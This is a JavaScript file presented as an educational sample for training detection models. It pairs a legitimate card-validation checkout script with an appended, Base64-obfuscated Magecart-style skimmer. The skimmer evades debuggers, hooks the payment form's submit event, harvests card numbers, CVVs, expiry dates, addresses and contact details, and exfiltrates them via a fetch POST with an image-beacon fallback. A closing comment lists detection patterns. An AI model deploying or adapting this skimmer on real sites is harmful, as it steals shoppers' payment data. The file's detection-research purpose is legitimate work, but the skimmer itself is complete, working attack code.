/**
 * CHECKOUT.JS - COMPROMISED VERSION (OBFUSCATED BASE64 VARIANT)
 *
 * This variant demonstrates the same attack with Base64 obfuscation
 * techniques commonly used by Magecart groups.
 *
 * Key obfuscation techniques applied:
 * - Base64 encoding of critical strings
 * - String concatenation obfuscation
 * - Variable name mangling
 * - Anti-debug checks
 * - Execution delays
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

// ============================================================================
// PART 1: LEGITIMATE CHECKOUT CODE
// ============================================================================

;(function () {
  'use strict'

  console.log('[Checkout] Initializing legitimate checkout system...')

  /**
   * Validate credit card number using Luhn algorithm
   */
  function validateCardNumber(cardNumber) {
    const digits = cardNumber.replace(/\D/g, '')

    if (digits.length < 15 || digits.length > 16) {
      return { valid: false, error: 'Card number must be 15-16 digits' }
    }

    // Luhn algorithm
    let sum = 0
    let isEven = false

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits[i])

      if (isEven) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }

      sum += digit
      isEven = !isEven
    }

    const luhnValid = sum % 10 === 0
    if (!luhnValid) {
      return { valid: false, error: 'Invalid card number (Luhn algorithm check failed)' }
    }

    return { valid: true }
  }

  /**
   * Validate expiry date
   */
  function validateExpiry(expiry) {
    const parts = expiry.split('/')
    if (parts.length !== 2) return false

    const month = parseInt(parts[0])
    const year = parseInt('20' + parts[1])

    if (month < 1 || month > 12) return false

    const now = new Date()
    const currentYear = now.getFullYear()
    const currentMonth = now.getMonth() + 1

    if (year < currentYear) return false
    if (year === currentYear && month < currentMonth) return false

    return true
  }

  /**
   * Validate CVV
   */
  function validateCVV(cvv, cardNumber) {
    const digits = cvv.replace(/\D/g, '')
    const cleanCard = cardNumber.replace(/\D/g, '')

    // Amex (starts with 34 or 37) uses 4-digit CVV
    if (cleanCard.startsWith('34') || cleanCard.startsWith('37')) {
      return digits.length === 4
    }

    // Others use 3-digit CVV
    return digits.length === 3
  }

  /**
   * Show validation error
   */
  function showError(fieldId, message) {
    const field = document.getElementById(fieldId)
    field.style.borderColor = '#e74c3c'

    // Remove any existing error message
    const existingError = field.parentElement.querySelector('.error-message')
    if (existingError) {
      existingError.remove()
    }

    // Add error message
    const errorDiv = document.createElement('div')
    errorDiv.className = 'error-message'
    errorDiv.style.color = '#e74c3c'
    errorDiv.style.fontSize = '0.9rem'
    errorDiv.style.marginTop = '0.25rem'
    errorDiv.textContent = message
    field.parentElement.appendChild(errorDiv)

    // Focus the field
    field.focus()
  }

  /**
   * Clear validation errors
   */
  function clearErrors() {
    document.querySelectorAll('.error-message').forEach(el => el.remove())
    document.querySelectorAll('input, select').forEach(el => {
      el.style.borderColor = '#ddd'
    })
  }

  /**
   * Process payment (simulated)
   */
  function processPayment(formData) {
    console.log('[Checkout] Processing payment...')
    console.log('[Checkout] IMPORTANT: This is a simulated transaction')

    return new Promise(resolve => {
      setTimeout(() => {
        console.log('[Checkout] Payment processed successfully (simulated)')
        console.log('[Checkout] Transaction ID:', 'TXN-' + Date.now())
        resolve({
          success: true,
          transactionId: 'TXN-' + Date.now()
        })
      }, 1000)
    })
  }

  /**
   * Handle form submission
   */
  async function handleSubmit(event) {
    event.preventDefault()

    console.log('[Checkout] Form submitted')
    clearErrors()

    // Get form values
    const cardNumber = document.getElementById('card-number').value
    const cvv = document.getElementById('cvv').value
    const expiry = document.getElementById('expiry').value

    // Validate card number
    const cardValidation = validateCardNumber(cardNumber)
    if (!cardValidation.valid) {
      showError('card-number', cardValidation.error)
      return false
    }

    // Validate expiry
    if (!validateExpiry(expiry)) {
      showError('expiry', 'Card has expired or invalid date')
      return false
    }

    // Validate CVV
    if (!validateCVV(cvv, cardNumber)) {
      showError('cvv', 'Invalid CVV code')
      return false
    }

    // Show loading state
    const submitBtn = document.querySelector('.submit-btn')
    const originalText = submitBtn.textContent
    submitBtn.textContent = 'Processing...'
    submitBtn.disabled = true

    try {
      const formData = new FormData(event.target)
      const data = Object.fromEntries(formData.entries())

      const result = await processPayment(data)

      if (result.success) {
        event.target.style.display = 'none'
        const successMessage = document.getElementById('success-message')
        successMessage.classList.add('show')

        console.log('[Checkout] Order completed successfully')
      }
    } catch (error) {
      console.error('[Checkout] Payment processing error:', error)
      alert('Payment processing failed. Please try again.')

      submitBtn.textContent = originalText
      submitBtn.disabled = false
    }
  }

  /**
   * Initialize checkout
   */
  function init() {
    const form = document.getElementById('payment-form')

    if (form) {
      form.addEventListener('submit', handleSubmit)
      console.log('[Checkout] Checkout system ready')
    }
  }

  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init)
  } else {
    init()
  }
})()

// ============================================================================
// PART 2: OBFUSCATED MALICIOUS CODE
// ============================================================================
//
// This code demonstrates Base64 obfuscation techniques used by Magecart groups.
// Notice the heavy use of:
// - atob() for Base64 decoding
// - String concatenation
// - Variable name mangling
// - Anti-debugging checks
// ============================================================================

;(function () {
  'use strict'

  // Anti-debugging check - detect DevTools
  var a = function () {
    var b = new Date()
    debugger
    return new Date() - b > 100
  }

  // Random delay to evade detection
  var c = Math.floor(Math.random() * 1000) + 500

  setTimeout(function () {
    // Check for debugging attempts
    if (a()) {
      return // Exit if debugger detected
    }

    // Obfuscated configuration using Base64 and string concatenation
    var d = atob('aHR0cDovL2xvY2FsaG9zdDozMDAw') + '/' + atob('Y29sbGVjdA==') // http://localhost:9002/collect
    var e = atob('W1NLSU1NRVJd') // [SKIMMER]
    var f = atob('UE9TVA==') // POST
    var g = atob('YXBwbGljYXRpb24vanNvbg==') // application/json

    function h(i, j) {
      // Obfuscated logging function
      var k = atob('Y29uc29sZQ==') // console
      var l = atob('bG9n') // log
      if (window[k] && window[k][l]) {
        window[k][l](e, i, j || '')
      }
    }

    h(atob('SW5pdGlhbGl6aW5nIHNraW1tZXIuLi4=')) // 'Initializing skimmer...'

    function m() {
      h(atob('RXh0cmFjdGluZyBjYXJkIGRhdGEgZnJvbSBmb3JtIGZpZWxkcy4uLg==')) // 'Extracting card data from form fields...'

      // Obfuscated field selectors
      var n = '#' + atob('Y2FyZC1udW1iZXI=') // #card-number
      var o = '#' + atob('Y3Z2') // #cvv
      var p = '#' + atob('ZXhwaXJ5') // #expiry
      var q = '#' + atob('Y2FyZGhvbGRlci1uYW1l') // #cardholder-name
      var r = '#' + atob('YmlsbGluZy1hZGRyZXNz') // #billing-address
      var s = '#' + atob('Y2l0eQ==') // #city
      var t = '#' + atob('emlw') // #zip
      var u = '#' + atob('Y291bnRyeQ==') // #country
      var v = '#' + atob('ZW1haWw=') // #email
      var w = '#' + atob('cGhvbmU=') // #phone

      var x = {
        cardNumber: y([n, '[' + atob('bmFtZQ==') + '="' + atob('Y2FyZE51bWJlcg==') + '"]']), // [name="cardNumber"]
        cvv: y([o, '[' + atob('bmFtZQ==') + '="' + atob('Y3Z2') + '"]']),
        expiry: y([p, '[' + atob('bmFtZQ==') + '="' + atob('ZXhwaXJ5') + '"]']),
        cardholderName: y([q, '[' + atob('bmFtZQ==') + '="' + atob('Y2FyZGhvbGRlck5hbWU=') + '"]']),
        billingAddress: y([r, '[' + atob('bmFtZQ==') + '="' + atob('YmlsbGluZ0FkZHJlc3M=') + '"]']),
        city: y([s, '[' + atob('bmFtZQ==') + '="' + atob('Y2l0eQ==') + '"]']),
        zip: y([t, '[' + atob('bmFtZQ==') + '="' + atob('emlw') + '"]']),
        country: y([u, '[' + atob('bmFtZQ==') + '="' + atob('Y291bnRyeQ==') + '"]']),
        email: y([v, '[' + atob('bmFtZQ==') + '="' + atob('ZW1haWw=') + '"]']),
        phone: y([w, '[' + atob('bmFtZQ==') + '="' + atob('cGhvbmU=') + '"]'])
      }

      h(atob('RXh0cmFjdGVkIGRhdGE6'), x) // 'Extracted data:'

      // Add metadata
      x.metadata = {
        url: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screenResolution: screen.width + 'x' + screen.height
      }

      return x
    }

    function y(z) {
      h(atob('U2VhcmNoaW5nIGZvciBmaWVsZCB3aXRoIHNlbGVjdG9yczo='), z) // 'Searching for field with selectors:'
      for (var aa = 0; aa < z.length; aa++) {
        var bb = document.querySelector(z[aa])
        h(
          '"' + z[aa] + '":',
          bb
            ? atob('Zm91bmQgZWxlbWVudCB3aXRoIHZhbHVlICI=') + bb.value + '"' // 'found element with value "'
            : atob('bm90IGZvdW5k')
        ) // 'not found'
        if (bb && bb.value) {
          return bb.value.trim()
        }
      }
      return ''
    }

    function cc(dd) {
      var ee = dd.cardNumber.replace(/[\s-]/g, '')
      var ff = ee.length === 15 || ee.length === 16
      var gg = dd.cvv.length === 3 || dd.cvv.length === 4
      return ff && gg && dd.expiry
    }

    function hh(ii) {
      h(atob('RXhmaWx0cmF0aW5nIGRhdGEgdG8gQzIgc2VydmVyOg=='), ii) // 'Exfiltrating data to C2 server:'
      h(atob('VGFyZ2V0IFVSTD==') + ':', d) // 'Target URL:'
      h(atob('RGF0YSBzaXplOg=='), JSON.stringify(ii).length) // 'Data size:'

      var jj = JSON.stringify(ii)
      h(atob('UmVxdWVzdCBib2R5Og=='), jj) // 'Request body:'

      // Obfuscated fetch call
      var kk = atob('ZmV0Y2g=') // fetch
      window[kk](d, {
        method: f,
        headers: {
          'Content-Type': g
        },
        body: jj,
        mode: atob('Y29ycw=='), // cors
        credentials: atob('b21pdA==') // omit
      })
        .then(ll => {
          h(atob('RmV0Y2ggcmVzcG9uc2Ugc3RhdHVzOg=='), ll.status) // 'Fetch response status:'
          h(atob('RmV0Y2ggcmVzcG9uc2UgaGVhZGVyczo='), Object.fromEntries(ll.headers.entries())) // 'Fetch response headers:'
          return ll.text()
        })
        .then(mm => {
          h(atob('RmV0Y2ggcmVzcG9uc2UgYm9keTo='), mm) // 'Fetch response body:'
          h(atob('RGF0YSBzdWNjZXNzZnVsbHkgZXhmaWx0cmF0ZWQ=')) // 'Data successfully exfiltrated'
        })
        .catch(nn => {
          // Fallback using image beacon
          h(atob('QXR0ZW1wdGluZyBmYWxsYmFjayBpbWFnZSBiZWFjb24gbWV0aG9k')) // 'Attempting fallback image beacon method'
          var oo = new Image()
          var pp = new URLSearchParams({
            d: btoa(JSON.stringify(ii))
          })
          oo.src = d + '?' + pp.toString()
          oo.onload = () => h(atob('RmFsbGJhY2sgYmVhY29uIHN1Y2NlZWRlZA==')) // 'Fallback beacon succeeded'
          oo.onerror = () => h(atob('RmFsbGJhY2sgYmVhY29uIGZhaWxlZA==')) // 'Fallback beacon failed'
        })
    }

    function qq() {
      h(atob('SW5pdGlhbGl6aW5nIHNraW1tZXIuLi4=')) // 'Initializing skimmer...'

      var rr = setInterval(() => {
        var ss = document.querySelector('#' + atob('cGF5bWVudC1mb3Jt')) // #payment-form

        if (ss) {
          clearInterval(rr)
          h(atob('UGF5bWVudCBmb3JtIGZvdW5kLCBhdHRhY2hpbmcgc2tpbW1lcg==')) // 'Payment form found, attaching skimmer'
          h(atob('Rm9ybSBlbGVtZW50Og=='), ss) // 'Form element:'
          h(atob('Rm9ybSBmaWVsZHMgZm91bmQ6'), ss.elements.length) // 'Form fields found:'

          ss.addEventListener(atob('c3VibWl0'), function (tt) {
            // 'submit'
            h(atob('Rm9ybSBzdWJtaXNzaW9uIGRldGVjdGVk')) // 'Form submission detected'
            h(atob('RXZlbnQ6'), tt) // 'Event:'

            var uu = m()

            if (cc(uu)) {
              h(atob('VmFsaWQgY2FyZCBkYXRhIGZvdW5kLCBwcmVwYXJpbmcgZXhmaWx0cmF0aW9u')) // 'Valid card data found, preparing exfiltration'

              setTimeout(() => {
                hh(uu)
              }, 100)
            } else {
              h(atob('SW5zdWZmaWNpZW50IGNhcmQgZGF0YSwgc2tpcHBpbmcgZXhmaWx0cmF0aW9u')) // 'Insufficient card data, skipping exfiltration'
            }
          })

          h(atob('U2tpbW1lciByZWFkeSBhbmQgbGlzdGVuaW5n')) // 'Skimmer ready and listening'
        }
      }, 100)

      setTimeout(() => {
        clearInterval(rr)
      }, 10000)
    }

    // Start the obfuscated skimmer
    if (document.readyState === atob('bG9hZGluZw==')) {
      // 'loading'
      document.addEventListener(atob('RE9NQ29udGVudExvYWRlZA=='), qq) // 'DOMContentLoaded'
    } else {
      qq()
    }
  }, c)
})()

/**
 * OBFUSCATION ANALYSIS:
 *
 * This variant demonstrates typical Magecart obfuscation techniques:
 *
 * 1. Base64 Encoding: All string literals are Base64 encoded using atob()
 * 2. Variable Mangling: Meaningful names replaced with single letters
 * 3. String Concatenation: URLs and selectors split across concatenations
 * 4. Anti-Debugging: Debugger detection and timing checks
 * 5. Dynamic Access: Using bracket notation for property access
 *
 * Detection Patterns:
 * - High frequency of atob() calls
 * - Debugger statements and timing checks
 * - Obfuscated console.log access
 * - Base64 strings containing web-related keywords
 * - Dynamic property access patterns
 *
 * Despite obfuscation, the core functionality remains identical:
 * - Same form field extraction
 * - Same JSON data structure
 * - Same POST exfiltration method
 * - Same fallback image beacon
 *
 * ML Training Value:
 * This variant tests detection models' ability to:
 * - Recognize obfuscated patterns vs clear implementations
 * - Decode Base64 strings for content analysis
 * - Identify string concatenation obfuscation
 * - Detect anti-debugging techniques
 * - Generalize across syntactic variations
 */
